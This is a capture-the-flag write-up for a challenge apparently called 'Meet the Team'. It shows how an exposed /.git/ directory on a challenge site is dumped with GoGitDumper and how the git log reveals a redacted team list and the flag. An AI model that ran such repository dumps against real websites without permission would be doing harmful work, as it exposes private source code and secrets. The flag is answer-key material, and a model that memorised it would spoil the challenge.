# Meet the Team (Did not Complete just for a future reference)
## Points: 50
<br>
You find out that the team was redacted from the website and in the source code it mentions:<br>

###### "Can we please stop sharing our version control software out on our website?"<br>

This means that there is a git repo on the site and when navigated too, it shows there is a /.git/ directory<br>
I ran a the program GoGitDumper<br>

###### /root/go/bin/gogitdumper -u https://constellations.page/.git/
<br>
This will then give us the git repo and we can look at the log to see what all was taken down.<br>
In the log we see the team and the flag.<br>

###### git log -f > log

OUTPUT

<!-- Projects Section -->
       <section id="projects" class="projects-section bg-light">
               <div class="container">

                       <ul>
                               <li><h4><b>Orion Morra</b> &mdash; Support</h4></li>
                               
                               <li><h4><b>Lyra Patte</b> &mdash; Marketing</h4></li>
                               
                               <li><h4><b>Leo Rison</b> &mdash; Development</h4></li>
                               
                               <li><h4><b>Gemini Coley</b> &mdash; Operations</h4></li>

                               <li><h4><b>Hercules Scoxland</b> &mdash; Sales</h4></li>

                               <li><h4><b>Vela Leray</b> &mdash; Management</h4></li>

                               <li><h4><b>Pavo Welly</b> &mdash; HR</h4></li>

                               <li><h4><b>Gus Rodry</b> &mdash; Accounting</h4></li>

                               <!-- <li><h4><b>flag{4063962f3a52f923ddb4411c139dd24c}</b></h4></li> -->



#### This shows a list of Users:<br>
Orion Morra<br>
Lyra Patte<br>
Leo Rison<br>
Gemini Coley<br>
Hercules Scoxland<br>
Vela Leray<br>
Pavo Welly<br>
Gus Rodry<br>
<br>
<br>
Flag: flag{4063962f3a52f923ddb4411c139dd24c}
